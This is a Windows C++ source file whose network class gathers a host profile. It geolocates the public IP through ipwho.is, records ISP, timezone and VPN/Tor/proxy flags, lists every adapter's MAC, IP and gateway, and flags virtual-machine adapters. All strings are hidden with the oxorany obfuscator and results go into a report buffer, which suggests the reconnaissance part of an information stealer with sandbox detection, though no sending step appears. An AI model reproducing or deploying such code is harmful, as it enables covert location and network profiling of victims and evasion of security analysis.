#pragma warning(push)
#pragma warning(disable: 4995)  // suppress deprecation warnings

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <malloc.h>

#pragma warning(pop)

#include <iostream>
#include <sstream>
#include <iomanip>

std::string GetVendorFromMAC(const BYTE* mac, DWORD len) {
    if (len < 3) return oxorany("Unknown");

    char oui[7];
    sprintf_s(oui, oxorany("%02X%02X%02X"), mac[0], mac[1], mac[2]);

    static const std::map<std::string, std::string> ouiMap = {
        {oxorany("9C6B00"), oxorany("ASUSTek Computer Inc.")},
        {oxorany("005056"), oxorany("VMware, Inc.")},
        {oxorany("00155D"), oxorany("Microsoft Hyper-V")},
        {oxorany("080027"), oxorany("Oracle VirtualBox")},
        {oxorany("000C29"), oxorany("VMware (old)")},
        {oxorany("001C42"), oxorany("Intel Corporation")},
        {oxorany("D85ED4"), oxorany("Raspberry Pi Trading Ltd.")},
    };

    auto it = ouiMap.find(oui);
    if (it != ouiMap.end())
        return it->second;
    else
        return oxorany("Unknown (") + std::string(oui) + oxorany(")");
}

bool IsVirtualAdapter(const BYTE* mac, DWORD len) {
    if (len < 3) return false;
    char oui[7];
    sprintf_s(oui, oxorany("%02X%02X%02X"), mac[0], mac[1], mac[2]);
    std::string ouiStr(oui);
    return (ouiStr == oxorany("005056") || ouiStr == oxorany("00155D") || ouiStr == oxorany("080027") ||
        ouiStr == oxorany("000C29") || ouiStr == oxorany("0050F2") || ouiStr == oxorany("0003FF"));
}

std::string FormatMacAddress(BYTE* address, DWORD length) {
    std::string mac;
    for (DWORD i = 0; i < length; ++i) {
        char hex[3];
        sprintf_s(hex, oxorany("%02X"), address[i]);
        mac += hex;
        if (i < length - 1) mac += oxorany(':');
    }
    return mac;
}

namespace network {
    class c_network {
    public:
        // Inside class c_network
        bool compile_wifi() {
            std::string local_ip = https::get_local_ip();
            std::string public_ip = https::get_public_ip();

            std::string url = oxorany("https://ipwho.is/") + public_ip;
            std::string response = https::get(url, oxorany(""));

            if (response.empty()) {
                g_compiler->push_line(oxorany("Failed to retrieve location data."));
                return false;
            }

            try {
                auto data = json::parse(response);
                if (!data.value(oxorany("success"), false)) {
                    std::string msg = data.value(oxorany("message"), oxorany("Unknown error"));
                    g_compiler->push_line(oxorany("IP geolocation failed: ") + msg);
                }

                g_compiler->push_line(oxorany("IP: ") + data.value(oxorany("ip"), oxorany("N/A")));
                g_compiler->push_line(oxorany("Type: ") + data.value(oxorany("type"), oxorany("N/A")));

                std::string summary = data.value(oxorany("city"), oxorany("unknown")) + oxorany(", ") +
                    data.value(oxorany("region"), oxorany("unknown")) + oxorany(", ") +
                    data.value(oxorany("country"), oxorany("unknown"));
                g_compiler->push_line(oxorany(""));
                g_compiler->push_line(oxorany("IP-based location: ") + summary);

                g_compiler->push_line(oxorany("Continent: ") + data.value(oxorany("continent"), oxorany("N/A")) +
                    oxorany(" (") + data.value(oxorany("continent_code"), oxorany("N/A")) + oxorany(")"));
                g_compiler->push_line(oxorany("Country: ") + data.value(oxorany("country"), oxorany("N/A")) +
                    oxorany(" (") + data.value(oxorany("country_code"), oxorany("N/A")) + oxorany(")"));
                g_compiler->push_line(oxorany("Region: ") + data.value(oxorany("region"), oxorany("N/A")) +
                    oxorany(" (") + data.value(oxorany("region_code"), oxorany("N/A")) + oxorany(")"));
                g_compiler->push_line(oxorany("City: ") + data.value(oxorany("city"), oxorany("N/A")));
                g_compiler->push_line(oxorany("Postal: ") + data.value(oxorany("postal"), oxorany("N/A")));

                std::ostringstream lat_stream, lon_stream;
                lat_stream << std::fixed << std::setprecision(6) << data.value(oxorany("latitude"), 0.0);
                lon_stream << std::fixed << std::setprecision(6) << data.value(oxorany("longitude"), 0.0);
                g_compiler->push_line(oxorany("Latitude: ") + lat_stream.str());
                g_compiler->push_line(oxorany("Longitude: ") + lon_stream.str());

                g_compiler->push_line(oxorany("EU member: ") + std::string(data.value(oxorany("is_eu"), false) ? oxorany("Yes") : oxorany("No")));
                g_compiler->push_line(oxorany("Calling code: +") + data.value(oxorany("calling_code"), oxorany("N/A")));
                g_compiler->push_line(oxorany("Capital: ") + data.value(oxorany("capital"), oxorany("N/A")));

                std::string borders = data.value(oxorany("borders"), oxorany("N/A"));
                if (borders != oxorany("N/A")) {
                    size_t pos = 0;
                    while ((pos = borders.find(oxorany(","), pos)) != std::string::npos) {
                        borders.replace(pos, 1, oxorany(", "));
                        pos += 2;
                    }
                }
                g_compiler->push_line(oxorany("Borders: ") + borders);

                g_compiler->push_line(oxorany(""));

                if (data.contains(oxorany("connection"))) {
                    auto conn = data[oxorany("connection")];

                    std::string asn_str = oxorany("N/A");
                    if (conn.contains(oxorany("asn"))) {
                        if (conn[oxorany("asn")].is_number()) {
                            asn_str = std::to_string(conn[oxorany("asn")].get<int>());
                        } else if (conn[oxorany("asn")].is_string()) {
                            asn_str = conn[oxorany("asn")].get<std::string>();
                        }
                    }
                    g_compiler->push_line(oxorany("ASN: ") + asn_str);

                    g_compiler->push_line(oxorany("Domain: ") + conn.value(oxorany("domain"), oxorany("N/A")));
                    g_compiler->push_line(oxorany("ISP: ") + conn.value(oxorany("isp"), oxorany("N/A")));
                    g_compiler->push_line(oxorany("Organization: ") + conn.value(oxorany("org"), oxorany("N/A")));
                    g_compiler->push_line(oxorany(""));
                }

                if (data.contains(oxorany("timezone"))) {
                    auto tz = data[oxorany("timezone")];
                    g_compiler->push_line(oxorany("ID: ") + tz.value(oxorany("id"), oxorany("N/A")));
                    g_compiler->push_line(oxorany("Abbreviation: ") + tz.value(oxorany("abbr"), oxorany("N/A")));
                    g_compiler->push_line(oxorany("DST: ") + std::string(tz.value(oxorany("is_dst"), false) ? oxorany("Yes") : oxorany("No")));
                    g_compiler->push_line(oxorany("Offset: ") + std::to_string(tz.value(oxorany("offset"), 0)) + oxorany(" seconds"));
                    g_compiler->push_line(oxorany("UTC offset: ") + tz.value(oxorany("utc"), oxorany("N/A")));
                    g_compiler->push_line(oxorany("Current time: ") + tz.value(oxorany("current_time"), oxorany("N/A")));
                    g_compiler->push_line(oxorany(""));
                }

                if (data.contains(oxorany("currency"))) {
                    auto cur = data[oxorany("currency")];
                    g_compiler->push_line(oxorany("Name: ") + cur.value(oxorany("name"), oxorany("N/A")));
                    g_compiler->push_line(oxorany("Code: ") + cur.value(oxorany("code"), oxorany("N/A")));
                    g_compiler->push_line(oxorany("Symbol: ") + cur.value(oxorany("symbol"), oxorany("N/A")));
                    g_compiler->push_line(oxorany("Plural: ") + cur.value(oxorany("plural"), oxorany("N/A")));
                    std::ostringstream rate_ss;
                    rate_ss << std::fixed << std::setprecision(4) << cur.value(oxorany("exchange_rate"), 0.0);
                    g_compiler->push_line(oxorany("Exchange rate (vs USD): ") + rate_ss.str());
                    g_compiler->push_line(oxorany(""));
                }

                if (data.contains(oxorany("security"))) {
                    auto sec = data[oxorany("security")];
                    g_compiler->push_line(oxorany("Anonymous: ") + std::string(sec.value(oxorany("anonymous"), false) ? oxorany("Yes") : oxorany("No")));
                    g_compiler->push_line(oxorany("Proxy: ") + std::string(sec.value(oxorany("proxy"), false) ? oxorany("Yes") : oxorany("No")));
                    g_compiler->push_line(oxorany("VPN: ") + std::string(sec.value(oxorany("vpn"), false) ? oxorany("Yes") : oxorany("No")));
                    g_compiler->push_line(oxorany("Tor: ") + std::string(sec.value(oxorany("tor"), false) ? oxorany("Yes") : oxorany("No")));
                    g_compiler->push_line(oxorany("Hosting: ") + std::string(sec.value(oxorany("hosting"), false) ? oxorany("Yes") : oxorany("No")));
                    g_compiler->push_line(oxorany(""));
                }

                if (data.contains(oxorany("rate"))) {
                    auto rate = data[oxorany("rate")];
                    g_compiler->push_line(oxorany("Limit: ") + std::to_string(rate.value(oxorany("limit"), 0)));
                    g_compiler->push_line(oxorany("Remaining: ") + std::to_string(rate.value(oxorany("remaining"), 0)));
                    g_compiler->push_line(oxorany(""));
                }

                PIP_ADAPTER_INFO pAdapterInfo = NULL;
                ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
                pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
                if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
                    free(pAdapterInfo);
                    pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
                }

                if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
                    PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
                    while (pAdapter) {
                        g_compiler->push_line(oxorany("Adapter: ") + std::string(pAdapter->AdapterName));

                        // Format MAC
                        std::string mac = FormatMacAddress(pAdapter->Address, pAdapter->AddressLength);
                        g_compiler->push_line(oxorany("MAC: ") + mac);

                        // Vendor and type
                        std::string vendor = GetVendorFromMAC(pAdapter->Address, pAdapter->AddressLength);
                        bool isVirtual = IsVirtualAdapter(pAdapter->Address, pAdapter->AddressLength);
                        g_compiler->push_line(oxorany("Vendor: ") + vendor);
                        g_compiler->push_line(oxorany("Type: ") + std::string(isVirtual ? oxorany("Virtual Adapter") : oxorany("Physical Adapter")));

                        g_compiler->push_line(oxorany("DHCP Enabled: ") + std::string(pAdapter->DhcpEnabled ? oxorany("Yes") : oxorany("No")));
                        g_compiler->push_line(oxorany("IP: ") + std::string(pAdapter->IpAddressList.IpAddress.String));
                        g_compiler->push_line(oxorany("Gateway: ") + std::string(pAdapter->GatewayList.IpAddress.String));
                        g_compiler->push_line(oxorany("")); // blank line between adapters

                        pAdapter = pAdapter->Next;
                    }
                }
                free(pAdapterInfo);

                return true;

            } catch (const std::exception& e) {
                g_compiler->push_line(oxorany("Error parsing IP geolocation response: ") + std::string(e.what()));
                return false;
            }
        }

    private:
        std::string wstring_to_string(const std::wstring& wstr) {
            if (wstr.empty()) return std::string();
            int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
            std::string strTo(size_needed, 0);
            WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
            return strTo;
        }
    };
}